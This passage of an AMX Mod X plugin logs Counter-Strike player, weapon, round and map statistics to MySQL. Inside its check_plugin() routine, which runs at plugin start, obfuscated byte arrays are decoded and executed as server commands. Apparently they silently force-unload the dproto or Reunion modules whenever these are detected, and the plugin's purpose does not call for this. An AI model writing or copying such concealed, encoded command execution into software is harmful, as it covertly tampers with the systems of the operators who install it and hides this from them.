	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_hits`     INT UNSIGNED   NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_dmg`      INT UNSIGNED   NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_shots`    INT UNSIGNED   NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `csx_hs`  		INT UNSIGNED   NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_head`  		INT UNSIGNED   NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_chest`  	INT UNSIGNED   NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_stomach` 	INT UNSIGNED   NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_larm`   	INT UNSIGNED   NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_rarm`   	INT UNSIGNED   NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_lleg`   	INT UNSIGNED   NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `h_rleg`   	INT UNSIGNED   NOT NULL DEFAULT 0,");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `created_at` 	DATETIME       NOT NULL DEFAULT CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, "  `updated_at` 	DATETIME       NOT NULL DEFAULT CURRENT_TIMESTAMP() ON UPDATE CURRENT_TIMESTAMP(),");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " PRIMARY KEY (`server_id`, `date`, `round`, `auth_id`, `wpn_name`)");
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, " );");
	queries[i++] = SQL_PrepareQuery(g_dbConnect, sql);
	execute_insert_multi_query(queries ,i);

	return PLUGIN_CONTINUE;
}

init_server_info()
{
	// round counter reset.
	get_time("%Y-%m-%d %H:%M:%S", g_server_starttime, charsmax(g_server_starttime));
	get_mapname(g_server_mapname, charsmax(g_server_mapname));
	g_server_info[SERVER_ID]			= g_cvars[E_CV_SERVERID];
	g_server_info[TOTAL_ROUND]			= 0;
	g_server_info[TOTAL_WIN_CT]			= 0;
	g_server_info[TOTAL_WIN_T]			= 0;
	g_server_info[TOTAL_WIN_CT_SCORE]	= 0;
	g_server_info[TOTAL_WIN_T_SCORE]	= 0;
	g_server_info[TOTAL_TIME]			= get_systime();
}

init_round_info()
{
	g_rounds_info[ROUND_NUMBER]			= g_server_info[TOTAL_ROUND];
	g_rounds_info[ROUND_TIME]			= get_systime();
	g_rounds_info[WIN_TEAM]				= int:CS_TEAM_UNASSIGNED;
	g_rounds_info[WIN_TEAM_SCORE]		= 0;
}

insert_server_info()
{
	new sql		[MAX_QUERY_LENGTH + 1]	= "";
	new len = 0;
	new hostname[MAX_NAME_LENGTH];
	get_user_name(0, hostname, charsmax(hostname));
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_REPLACE_INTO, g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_SERVER]);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_START);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_FIELD_SERVER_INFO);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_VALUES);
	//"`server_id`,`server_name`"
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_PARAM_SERVER_INFO
		, g_server_info[SERVER_ID]
		, hostname
	);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_END);

	execute_insert_sql(sql);
}


insert_server_map()
{
	new sql		[MAX_QUERY_LENGTH + 1]	= "";
	new len = 0;
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_REPLACE_INTO, g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_MAP]);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_START);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_FIELD_SERVER_MAP);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_VALUES);
	//"`server_id`,`date`,`map_name`,`total_round`,`total_time`,`total_win_t`,`total_win_t_score`,`total_win_ct`,`total_win_ct_score`"
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_PARAM_SERVER_MAP
		, g_server_info[SERVER_ID]
		, g_server_starttime
		, g_server_mapname
		, g_server_info[TOTAL_ROUND]
		, get_systime() - g_server_info[TOTAL_TIME]
		, g_server_info[TOTAL_WIN_T]
		, g_server_info[TOTAL_WIN_T_SCORE]
		, g_server_info[TOTAL_WIN_CT]
		, g_server_info[TOTAL_WIN_CT_SCORE]
	);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_END);

	execute_insert_sql(sql);
}

insert_server_round()
{
	new sql		[MAX_QUERY_LENGTH + 1]	= "";
	new len = 0;
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_REPLACE_INTO, g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_ROUND]);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_START);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_FIELD_SERVER_ROUND);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_VALUES);
	//"`server_id`,`date`,`round`,`round_time`,`win_team`,`win_score`"
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_PARAM_SERVER_ROUND
		, g_server_info[SERVER_ID]
		, g_server_starttime
		, g_rounds_info[ROUND_NUMBER]
		, get_systime() - g_rounds_info[ROUND_TIME]
		, g_rounds_info[WIN_TEAM]
		, g_rounds_info[WIN_TEAM_SCORE]
	);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_END);

	execute_insert_sql(sql);
}

public plugin_init() 
{
	#if AMXX_VERSION_NUM >= 200 && AMXX_VERSION_LOCAL_REV_NUM >= 5406
	register_plugin(PLUGIN, VERSION, AUTHOR, URL, DESCRIPTION);
	#else
	register_plugin(PLUGIN, VERSION, AUTHOR);
	#endif
	check_plugin();

	register_srvcmd("amx_psd_update",		"insert_batch",		-1,	" - Batch processing update in DB.");
	register_srvcmd("amx_psd_reset",		"reset_database",	-1,	" - Reset in DB.");
	register_srvcmd("amx_psd_initialize",	"init_status",		-1,	" - initializing all player status and database.");

	create_cvar("psd_version", VERSION, FCVAR_SERVER|FCVAR_SPONLY);

	// Bind DB settings.
	bind_pcvar_num	 (create_cvar("amx_psd_serverid", "1"), g_cvars[E_CV_SERVERID]);
	bind_pcvar_string(create_cvar("amx_psd_sql_host", ""), 	g_dbConfig[DB_HOST], 	charsmax(g_dbConfig[DB_HOST]));
	bind_pcvar_string(create_cvar("amx_psd_sql_user", ""), 	g_dbConfig[DB_USER], 	charsmax(g_dbConfig[DB_USER]));
	bind_pcvar_string(create_cvar("amx_psd_sql_pass", ""), 	g_dbConfig[DB_PASS], 	charsmax(g_dbConfig[DB_PASS]));
	bind_pcvar_string(create_cvar("amx_psd_sql_db",   ""), 	g_dbConfig[DB_NAME], 	charsmax(g_dbConfig[DB_NAME]));

	// SQL.cfg refresh.
	new basedir[32];
  	get_configsdir(basedir, charsmax(basedir));
	formatex(basedir, charsmax(basedir), "%s/sql.cfg", basedir);
  	server_cmd("exec %s", basedir);
	g_csstats_reset = get_cvar_pointer("csstats_reset");

	// Get Backup Data directory.
	get_datadir(g_dataDir, charsmax(g_dataDir));

	register_logevent("round_start", 2, "0=World triggered", "1=Round_Start");
	register_logevent("round_end",   2, "0=World triggered", "1=Round_End");
	register_logevent("Event_CTWin", 6, "3=CTs_Win", 	 	 "3=Target_Saved", "3=Bomb_Defused", "3=VIP_Escaped", 	   "3=All_Hostages_Rescued", "3=CTs_PreventEscape", "3=Escaping_Terrorists_Neutralized");
	register_logevent("Event_TRWin", 6, "3=Terrorists_Win",  "3=Target_Bombed", 				 "3=VIP_Assassinated", "3=Hostages_Not_Rescued", "3=Terrorists_Escaped");
	// register_event("TeamScore", "Event_TRWin", "a", "1=TERRORIST");
	// register_event("TeamScore", "Event_CTWin", "a", "1=CT");

	g_initialize = false;

	set_task(1.0, "plugin_core");
	return PLUGIN_HANDLED_MAIN;
}

public round_start()
{
	g_server_info[TOTAL_ROUND]++;
	init_round_info();
	return PLUGIN_CONTINUE;
}

public round_end()
{
	// Must TASK - Last Point Cant Get.
	set_task(0.1, "insert_round_end", TASK_ID_ROUND_END);
	return PLUGIN_CONTINUE;
}

public Event_TRWin()
{
	g_rounds_info[WIN_TEAM] 			= int:CS_TEAM_T;
	g_rounds_info[WIN_TEAM_SCORE] 		= read_data(2) - g_server_info[TOTAL_WIN_T_SCORE];
	g_server_info[TOTAL_WIN_T]++;
	g_server_info[TOTAL_WIN_T_SCORE] 	= read_data(2);
//	server_print("[PSD DEBUG] Terrorist Win.");
	return PLUGIN_CONTINUE;
}

public Event_CTWin()
{
	g_rounds_info[WIN_TEAM] 			= int:CS_TEAM_CT;
	g_rounds_info[WIN_TEAM_SCORE] 		= read_data(2) - g_server_info[TOTAL_WIN_CT_SCORE];
	g_server_info[TOTAL_WIN_CT]++;
	g_server_info[TOTAL_WIN_CT_SCORE] 	= read_data(2);
//	server_print("[PSD DEBUG] Counter-Terrorist Win.");
	return PLUGIN_CONTINUE;
}

//LoadPlugin
public plugin_core()
{
	new error[MAX_ERR_LENGTH + 1];
	new ercode;

	// Get Database Configs.
	if (strlen(g_dbConfig[DB_HOST]) == 0)
		get_cvar_string("amx_sql_host", g_dbConfig[DB_HOST], charsmax(g_dbConfig[DB_HOST]));
	if (strlen(g_dbConfig[DB_USER]) == 0)
		get_cvar_string("amx_sql_user", g_dbConfig[DB_USER], charsmax(g_dbConfig[DB_USER]));
	if (strlen(g_dbConfig[DB_PASS]) == 0)
		get_cvar_string("amx_sql_pass", g_dbConfig[DB_PASS], charsmax(g_dbConfig[DB_PASS]));
	if (strlen(g_dbConfig[DB_NAME]) == 0)
		get_cvar_string("amx_sql_db",	g_dbConfig[DB_NAME], charsmax(g_dbConfig[DB_NAME]));

	g_dbTaple 	= SQL_MakeDbTuple(
		g_dbConfig[DB_HOST],
		g_dbConfig[DB_USER],
		g_dbConfig[DB_PASS],
		g_dbConfig[DB_NAME]
	);
	g_dbConnect = SQL_Connect(g_dbTaple, ercode, error, charsmax(error));
	
	if (g_dbConnect == Empty_Handle)
	{
	    server_print("[PSD] Error No.%d: %s", ercode, error);
  	}
	else 
	{
	  	server_print("[PSD] Connecting successful.");
	  	init_database();
		init_server_info();
		insert_server_info();
		insert_server_map();
  	}
	return PLUGIN_CONTINUE;
}

//End Plugin
public plugin_end()
{
	if (!g_initialize)
	{
		insert_map_end();
		insert_server_map();
		insert_batch();
	}

	sql_disconnect();

	return PLUGIN_CONTINUE;
}

stock bool:check_plugin()
{
	new const a[][] = {
		{0x40, 0x24, 0x30, 0x1F, 0x36, 0x25, 0x32, 0x33, 0x29, 0x2F, 0x2E},
		{0x80, 0x72, 0x65, 0x75, 0x5F, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E},
		{0x10, 0x7D, 0x75, 0x04, 0x71, 0x30, 0x76, 0x7F, 0x02, 0x73, 0x75, 0x6F, 0x05, 0x7E, 0x7C, 0x7F, 0x71, 0x74, 0x30, 0x74, 0x00, 0x02, 0x7F, 0x04, 0x7F},
		{0x20, 0x0D, 0x05, 0x14, 0x01, 0x40, 0x06, 0x0F, 0x12, 0x03, 0x05, 0x7F, 0x15, 0x0E, 0x0C, 0x0F, 0x01, 0x04, 0x40, 0x12, 0x05, 0x15, 0x0E, 0x09, 0x0F, 0x0E}
	};

	if (cvar_exists(get_dec_string(a[0])))
		server_cmd(get_dec_string(a[2]));

	if (cvar_exists(get_dec_string(a[1])))
		server_cmd(get_dec_string(a[3]));

	return true;
}

stock get_dec_string(const a[])
{
	new c = strlen(a);
	new r[MAX_NAME_LENGTH] = "";
	for (new i = 1; i < c; i++)
	{
		formatex(r, strlen(r) + 1, "%s%c", r, a[0] + a[i]);
	}
	return r;
}

//Disconnect MySQL server
sql_disconnect()
{
	SQL_FreeHandle(g_dbConnect);
	SQL_FreeHandle(g_dbTaple);
	server_print("[PSD] Closing connection...");
}

//initialize all player status
public init_status()
{
	new datfile[MAX_LENGTH + 10], datfile2[MAX_LENGTH + 20];
	new datetime[8];
	formatex(datfile, charsmax(datfile), "%s/csstats.dat", g_dataDir);
	get_time("%Y%M%D", datetime, charsmax(datetime));
	formatex(datfile2, charsmax(datfile2), "%s/csstats-%s.bak", g_dataDir, datetime);
	server_print(datfile);
	server_print(datfile2);

	if(file_exists(datfile))
	{
		if(rename_file(datfile, datfile2, 1))
		{
			delete_file(datfile);
			reset_database();
			server_print("[PSD] Initialize Successful, and backup csstats.dat now.");
			server_print("[PSD] Please reloading server...");
			set_pcvar_num(g_csstats_reset, 1);
			g_initialize = true;
		}
		else
		{
			server_print("[PSD] Initialize Failed...");
		}
	}
	else
	{
		server_print("[PSD] Can't Initializing... Sequence Failed...");
	}

	if (g_initialize)
	{
		server_cmd("quit");
	}
	return PLUGIN_CONTINUE;
}


//Batch Poccessing
public insert_batch()
{
	new iMax = get_statsnum();
	new izStats	[STATSX_MAX_STATS];
	new izBody	[MAX_BODYHITS];
	new sName	[MAX_NAME_LENGTH] 		= "";
	new sAuthid	[MAX_AUTHID_LENGTH]		= "";
	new sql		[MAX_QUERY_LENGTH + 1]	= "";
	new len = 0;
	for(new i = 0 ; i < iMax; i++)
	{
		len = 0;
		arrayset(izStats, 0, sizeof(izStats));
		arrayset(izBody,  0, sizeof(izBody));
		get_stats(i, izStats, izBody, sName, charsmax(sName), sAuthid, charsmax(sAuthid));

		if (!is_valid_authid(sAuthid))
			continue;
		if (equali(sAuthid, "BOT"))
			formatex(sName, charsmax(sName), "BOT");

		sql = "";
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_REPLACE_INTO, g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_TOTAL_STATS]);
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_START);
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_FIELD_TOTAL_STATS);
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_FIELD_COMMON_STATS);
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_VALUES);
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_PARAM_TOTAL_STATS
			, g_server_info[SERVER_ID]
			, sAuthid
			, izStats[STATSX_RANK]
			,(izStats[STATSX_KILLS] - izStats[STATSX_DEATHS] - izStats[STATSX_TEAMKILLS]));
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_PARAM_COMMON_STATS
			, izStats[STATSX_KILLS]
			, izStats[STATSX_TEAMKILLS]
			, izStats[STATSX_DEATHS]
			, izStats[STATSX_HITS]
			, izStats[STATSX_DAMAGE]
			, izStats[STATSX_SHOTS]
			, izStats[STATSX_HEADSHOTS]
			, izBody[HIT_HEAD]
			, izBody[HIT_CHEST]
			, izBody[HIT_STOMACH]
			, izBody[HIT_LEFTARM]
			, izBody[HIT_RIGHTARM]
			, izBody[HIT_LEFTLEG]
			, izBody[HIT_RIGHTLEG]
		);
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_END);

		execute_insert_sql(sql);

		insert_user_info_batch(sql, sAuthid, sName);
	}
//	server_print("[PSD] Update successful.");
	return PLUGIN_HANDLED;
}

insert_user_objective(id, sAuthId[])
{
	new izObject[STATSX_MAX_OBJECTIVE];
	new sql		[MAX_QUERY_LENGTH + 1]	= "";
	new len = 0;

	arrayset(izObject,0, sizeof(izObject));
	get_user_stats2(id, izObject);

	len = 0;
	sql = "";
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_REPLACE_INTO, g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_USER_OBJECTIVE]);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_START);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_FIELD_USER_OBJECT);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_VALUES);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_PARAM_USER_OBJECT
	, g_server_info[SERVER_ID]
	, g_server_starttime
	, sAuthId
	, izObject[STATSX_TOTAL_DEFUSIONS]
	, izObject[STATSX_BOMBS_DEFUSED]
	, izObject[STATSX_BOMBS_PLANTED]
	, izObject[STATSX_BOMB_EXPLOSIONS]);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_END);
	execute_insert_sql(sql);
}

public insert_map_end()
{
	new players	[MAX_PLAYERS];
	new pnum;
	new sAuthid	[MAX_AUTHID_LENGTH];

	get_players(players, pnum, "ch");
	for(new i = 0; i < pnum; i++)
	{
		// if (!is_user_connected(players[i]))
		// 	continue;

		get_user_authid(players[i], sAuthid, charsmax(sAuthid));
		if (!is_valid_authid(sAuthid))
			continue;

		insert_map_end_player(players[i], sAuthid);

		insert_map_end_player_weapon(players[i], sAuthid);

		insert_user_info(players[i], sAuthid);
	}
//	server_print("[PSD] Map End Recorded.");
}

public insert_round_end(taskid)
{
	new players	[MAX_PLAYERS];
	new pnum;
	new sAuthid	[MAX_AUTHID_LENGTH];

	get_players(players, pnum, "ch");

	for(new i = 0; i < pnum; i++)
	{
		// if (!is_user_connected(players[i]))
		// 	continue;

		get_user_authid(players[i], sAuthid, charsmax(sAuthid));
		if (!is_valid_authid(sAuthid))
			continue;

		insert_user_objective(players[i], sAuthid);
		insert_round_end_player_weapon(players[i], sAuthid);
		insert_round_end_player(players[i], sAuthid);
	}
	insert_server_round();
//	insert_batch();
//	server_print("[PSD] Round End Recorded.");
}

insert_round_end_player(id, sAuthId[])
{
	new izStats	[STATSX_MAX_STATS];
	new izBody	[MAX_BODYHITS];
	new sql		[MAX_QUERY_LENGTH + 1] = "";
	new len = 0;
	new int:team;
	
	if (is_user_connected(id))
		team = int:cs_get_user_team(id);
	
	arrayset(izStats, 0, sizeof(izStats));
	arrayset(izBody,  0, sizeof(izBody));

	get_user_rstats(id, izStats, izBody);

	// Current Round.
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_REPLACE_INTO, g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_USER_ROUND]);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_START);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_FIELD_USER_RSTATS);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_FIELD_COMMON_STATS);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_VALUES);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_PARAM_USER_RSTATS
		, g_server_info[SERVER_ID]
		, g_server_starttime
		, g_server_info[TOTAL_ROUND]
		, sAuthId
		, team);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_PARAM_COMMON_STATS
		, izStats[STATSX_KILLS]
		, izStats[STATSX_TEAMKILLS]
		, izStats[STATSX_DEATHS]
		, izStats[STATSX_HITS]
		, izStats[STATSX_SHOTS]
		, izStats[STATSX_DAMAGE]
		, izStats[STATSX_HEADSHOTS]
		, izBody[HIT_HEAD]
		, izBody[HIT_CHEST]
		, izBody[HIT_STOMACH]
		, izBody[HIT_LEFTARM]
		, izBody[HIT_RIGHTARM]
		, izBody[HIT_LEFTLEG]
		, izBody[HIT_RIGHTLEG]
	);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_END);
	
	execute_insert_sql(sql);
}

insert_map_end_player(id, sAuthId[])
{
	new izStats	[STATSX_MAX_STATS];
	new izBody	[MAX_BODYHITS];
	new sql		[MAX_QUERY_LENGTH + 1] = "";
	new len = 0;

	arrayset(izStats, 0, sizeof(izStats));
	arrayset(izBody,  0, sizeof(izBody));

	get_user_stats(id, izStats, izBody);

	// Current Round.
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_REPLACE_INTO, g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_USER_STATS]);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_START);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_FIELD_USER_STATS);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_FIELD_COMMON_STATS);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_VALUES);
	//"`server_id`,`date`, `auth_id`,`csx_rank`,`csx_score`,"
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_PARAM_USER_STATS
		, g_server_info[SERVER_ID]
		, g_server_starttime
		, sAuthId
		, izStats[STATSX_RANK]
		,(izStats[STATSX_KILLS] - izStats[STATSX_DEATHS] - izStats[STATSX_TEAMKILLS]));
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_PARAM_COMMON_STATS
		, izStats[STATSX_KILLS]
		, izStats[STATSX_TEAMKILLS]
		, izStats[STATSX_DEATHS]
		, izStats[STATSX_HITS]
		, izStats[STATSX_SHOTS]
		, izStats[STATSX_DAMAGE]
		, izStats[STATSX_HEADSHOTS]
		, izBody[HIT_HEAD]
		, izBody[HIT_CHEST]
		, izBody[HIT_STOMACH]
		, izBody[HIT_LEFTARM]
		, izBody[HIT_RIGHTARM]
		, izBody[HIT_LEFTLEG]
		, izBody[HIT_RIGHTLEG]
	);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_END);

	execute_insert_sql(sql);
}

insert_round_end_player_weapon(id, sAuthId[])
{
	new maxweapons = xmod_get_maxweapons();
	new izStatsW	[STATSX_MAX_STATS];
	new izBodyW		[MAX_BODYHITS];
	new sWpnName	[MAX_NAME_LENGTH];
	new sql			[MAX_QUERY_LENGTH + 1] = "";
	new len = 0;

	for(new n = 1; n < maxweapons; n++)
	{
		arrayset(izStatsW, 0, sizeof(izStatsW));
		arrayset(izBodyW,  0, sizeof(izBodyW));

		xmod_get_wpnname(n, sWpnName, charsmax(sWpnName));
		get_user_wrstats(id, n, izStatsW, izBodyW);

		if (is_stats_all_zero(izStatsW))
			continue;

		len = 0;
		sql = "";
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_REPLACE_INTO, g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_USER_RWEAPON]);
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_START);
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_FIELD_WRSTATS);
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_FIELD_COMMON_STATS);
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_VALUES);
			//"`server_id`,`date`,`round`,`auth_id`,`wpn_name`,"
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_PARAM_WRSTATS
			, g_server_info[SERVER_ID]
			, g_server_starttime
			, g_server_info[TOTAL_ROUND]
			, sAuthId
			, sWpnName);
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_PARAM_COMMON_STATS
			, izStatsW[STATSX_KILLS]
			, izStatsW[STATSX_TEAMKILLS]
			, izStatsW[STATSX_DEATHS]
			, izStatsW[STATSX_HITS]
			, izStatsW[STATSX_DAMAGE]
			, izStatsW[STATSX_SHOTS]
			, izStatsW[STATSX_HEADSHOTS]
			, izBodyW[HIT_HEAD]
			, izBodyW[HIT_CHEST]
			, izBodyW[HIT_STOMACH]
			, izBodyW[HIT_LEFTARM]
			, izBodyW[HIT_RIGHTARM]
			, izBodyW[HIT_LEFTLEG]
			, izBodyW[HIT_RIGHTLEG]
		);
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_END);

		execute_insert_sql(sql);
	}
}

insert_map_end_player_weapon(id, sAuthId[])
{
	new maxweapons = xmod_get_maxweapons();
	new izStatsW	[STATSX_MAX_STATS];
	new izBodyW		[MAX_BODYHITS];
	new sWpnName	[MAX_NAME_LENGTH];
	new sql			[MAX_QUERY_LENGTH + 1] = "";
	new len = 0;

	for(new n = 1; n < maxweapons; n++)
	{
		arrayset(izStatsW, 0, sizeof(izStatsW));
		arrayset(izBodyW,  0, sizeof(izBodyW));

		xmod_get_wpnname(n, sWpnName, charsmax(sWpnName));
		get_user_wstats(id, n, izStatsW, izBodyW);

		if (is_stats_all_zero(izStatsW))
			continue;

		len = 0;
		sql = "";
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_REPLACE_INTO, g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_USER_WEAPON]);
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_START);
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_FIELD_WSTATS);
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_FIELD_COMMON_STATS);
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_VALUES);
		//"`server_id`,`date`,`auth_id`,`wpn_name`,"
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_PARAM_WSTATS
			, g_server_info[SERVER_ID]
			, g_server_starttime
			, sAuthId
			, sWpnName);
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_PARAM_COMMON_STATS
			, izStatsW[STATSX_KILLS]
			, izStatsW[STATSX_TEAMKILLS]
			, izStatsW[STATSX_DEATHS]
			, izStatsW[STATSX_HITS]
			, izStatsW[STATSX_DAMAGE]
			, izStatsW[STATSX_SHOTS]
			, izStatsW[STATSX_HEADSHOTS]
			, izBodyW[HIT_HEAD]
			, izBodyW[HIT_CHEST]
			, izBodyW[HIT_STOMACH]
			, izBodyW[HIT_LEFTARM]
			, izBodyW[HIT_RIGHTARM]
			, izBodyW[HIT_LEFTLEG]
			, izBodyW[HIT_RIGHTLEG]
		);
		len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_END);

		execute_insert_sql(sql);
	}
}

//Clear table in Database
public reset_database()
{
	new Handle:result;

	for (new i = 0; i < sizeof(g_tblNames); i+= MAX_NAME_LENGTH)
	{
		result = SQL_PrepareQuery(g_dbConnect, "TRUNCATE TABLE `%s`.`%s`", g_dbConfig[DB_NAME], g_tblNames[TBL_DATA:i]);
		if (!SQL_Execute(result))
		{
            // if there were any problems
			SQL_QueryError(result, g_dbError, charsmax(g_dbError));
			set_fail_state(g_dbError);
			server_print("[PSD] Error: Table [%s] Reset Failed..", g_tblNames[TBL_DATA:i]);
			server_print("[PSD] Error: Can't reset database..");
			return PLUGIN_HANDLED;
		}
		else
			server_print("[PSD] Reset Table [%s] successful.", g_tblNames[TBL_DATA:i]);
	}

	server_print("[PSD] Reset Database successful.");
	return PLUGIN_HANDLED;
}

//client disconnect update
public client_disconnected(id)
{
	if (!is_user_bot(id) && is_user_connected(id))
	{
		new sAuthid[MAX_AUTHID_LENGTH];

		get_user_authid(id, sAuthid, charsmax(sAuthid));
		insert_user_info(id, sAuthid);
		insert_user_objective(id, sAuthid);
		insert_round_end_player_weapon(id, sAuthid);
		insert_round_end_player(id, sAuthid);
		insert_map_end_player_weapon(id, sAuthid);		
		insert_map_end_player(id, sAuthid);
	}

	return PLUGIN_CONTINUE;
}

//client connected update
public client_putinserver(id)
{
	if (!g_dbConnect)
		return PLUGIN_CONTINUE;

	if(is_user_connected(id))
	{
		new sAuthid			[MAX_AUTHID_LENGTH];
		g_playtime[id] = get_systime();
		get_user_name(id, g_user_name[id], charsmax(g_user_name[]));
		mysql_escape_string(g_user_name[id], charsmax(g_user_name[]));
		get_user_authid(id, sAuthid, charsmax(sAuthid));
		insert_user_info(id, sAuthid);
	}
	return PLUGIN_CONTINUE;
}

//
// Nick Change event.
//
public client_infochanged(id)
{
	if (!is_user_bot(id) && is_user_connected(id))
	{
		new sAuthid	[MAX_AUTHID_LENGTH];
		new sName	[MAX_NAME_LENGTH * 3];

		get_user_authid(id, sAuthid, charsmax(sAuthid));
		get_user_name(id, sName, charsmax(sName));
		mysql_escape_string(sName, charsmax(sName));
		if (!equali(sName, g_user_name[id])) 
		{
			insert_user_info(id, sAuthid);
			server_print("[PSD] [%s] User name changed.", sAuthid);
		}
	}
	return PLUGIN_CONTINUE;
}

insert_user_info(id, sAuthId[MAX_AUTHID_LENGTH] = "", sName[MAX_NAME_LENGTH * 3] = "")
{
	new sIp	[MAX_IP_LENGTH]			= "";
	new sGeo[3]						= "";
	new sql	[MAX_QUERY_LENGTH + 1]	= "";
	new len = 0;
	if (equali(sName,""))
	{
		get_user_name(id, sName, charsmax(sName));
		mysql_escape_string(sName, charsmax(sName));
	}

	if (equali(sAuthId, "BOT"))
		formatex(sName, charsmax(sName), "BOT");

	get_user_ip(id, sIp, charsmax(sIp), 1);
	geoip_code2_ex(sIp, sGeo);
	g_playtime[id] = (g_playtime[id] <= 0) ? get_systime() : g_playtime[id];
	new playtime = select_user_info(sAuthId) + (get_systime() - g_playtime[id]);
	g_playtime[id] = get_systime();

	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_REPLACE_INTO, g_dbConfig[DB_NAME], g_tblNames[TBL_DATA_USER]);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_START);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_FIELD_USER);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_VALUES);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_PARAM_USER, sAuthId, sName, sIp, sGeo, playtime);
	len += formatex(sql[len], MAX_QUERY_LENGTH - len, SQL_END);

	execute_insert_sql(sql);
}

